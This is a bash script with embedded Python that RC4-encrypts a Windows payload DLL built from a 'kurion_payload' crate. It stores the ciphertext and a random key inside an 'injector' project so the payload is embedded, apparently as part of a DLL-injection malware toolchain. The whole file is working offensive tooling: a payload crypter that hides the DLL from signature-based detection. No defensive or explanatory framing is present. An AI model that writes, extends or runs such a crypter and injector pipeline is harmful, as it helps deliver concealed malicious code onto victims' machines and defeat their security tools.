#!/bin/bash

set -e

INPUT="${1:-target/x86_64-pc-windows-gnu/release/payload.dll}"
OUTPUT="${2:-injector/src/injector/payload.enc}"

if [ ! -f "$INPUT" ]; then
    echo "[-] Input file not found: $INPUT"
    echo "[*] Build the payload first: cargo build --release --target x86_64-pc-windows-gnu -p kurion_payload"
    exit 1
fi

echo "[*] Encrypting payload..."

KEY=$(head -c 32 /dev/urandom | xxd -p | tr -d '\n')

python3 << PYTHON
import sys

key = bytes.fromhex("$KEY")
with open("$INPUT", "rb") as f:
    data = bytearray(f.read())

s = list(range(256))
j = 0
for i in range(256):
    j = (j + s[i] + key[i % len(key)]) % 256
    s[i], s[j] = s[j], s[i]

i = j = 0
for idx in range(len(data)):
    i = (i + 1) % 256
    j = (j + s[i]) % 256
    s[i], s[j] = s[j], s[i]
    k = s[(s[i] + s[j]) % 256]
    data[idx] ^= k

with open("$OUTPUT", "wb") as f:
    f.write(data)

with open("${OUTPUT}.key", "wb") as f:
    f.write(key)

print(f"[+] Encrypted {len(data)} bytes")
print(f"[+] Output: $OUTPUT")
print(f"[+] Key: ${OUTPUT}.key")
PYTHON

echo "[+] Done! Rebuild injector to embed encrypted payload."
